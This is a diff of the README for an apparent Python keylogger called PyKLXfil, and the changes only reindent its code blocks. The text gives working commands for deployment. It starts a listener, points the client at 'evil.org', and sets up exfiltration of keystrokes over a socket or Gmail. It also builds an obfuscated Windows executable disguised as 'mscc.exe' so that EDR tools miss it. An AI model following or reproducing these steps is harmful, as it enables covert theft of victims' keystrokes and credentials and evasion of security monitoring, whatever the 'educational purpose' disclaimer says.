@@ -7,11 +7,11 @@
 #### Disclaimer: For educational purpose, use at your own responsibility.
 ## Install:
 ```sh
-  git clone https://github.com/iD4rksid3/PyKLXfil.git
-  cd PyKLXfil
-  #The tool requires only two external modules: yagmail and pynput
-  pip3 install -r requirements.txt
-  ```
+git clone https://github.com/iD4rksid3/PyKLXfil.git
+cd PyKLXfil
+#The tool requires only two external modules: yagmail and pynput
+pip3 install -r requirements.txt
+```
 ## Usage:
 ### Key logging and exfiltration using socket server and client:
 * On the server, start listening on all NICs and on port 443 as background job:
@@ -20,18 +20,18 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
 ```
 * For the client, edit PyKLXfil-Client.py and add your server's IP/domain and port then compile and obfuscate the script for a Windows machine:
 ```sh
- nano PyKLXfil-Client.py
- #snip...       
- #self.host = 'evil.org'
- #self.port = 4444
- ```
+nano PyKLXfil-Client.py
+#snip...       
+#self.host = 'evil.org'
+#self.port = 4444
+```
  * Make Windows executable client by either of the ways:
  1. obfuscated Windows executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
- ```sh
- pip3 install pyarmor
- pip3 install pyinstaller
- pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client.py -n mscc.exe
- ```
+```sh
+pip3 install pyarmor
+pip3 install pyinstaller
+pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client.py -n mscc.exe
+```
  OR:
  
  2. Compile the script to exe using [pyinstaller](https://github.com/pyinstaller/pyinstaller):
@@ -43,18 +43,18 @@ pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidd
 * You will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
 ```sh
 nano PyKLXfil-Client-mail.py
- #snip...       
-  #user = 'example@gmail.com'
-  #app_password = 'qweertyuiop12345678'
-  #to = 'example@gmail.com'
+#snip...       
+#user = 'example@gmail.com'
+#app_password = 'qweertyuiop12345678'
+#to = 'example@gmail.com'
 ```
 * Make Windows executable client with either:
 1. Make obfuscated executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
- ```sh
- pip3 install pyarmor
- pip3 install pyinstaller
- pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client-mail.py -n mscc.exe
- ```
+```sh
+pip3 install pyarmor
+pip3 install pyinstaller
+pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client-mail.py -n mscc.exe
+```
  OR:
  
 2. Compile the script to exe using pyinstaller:
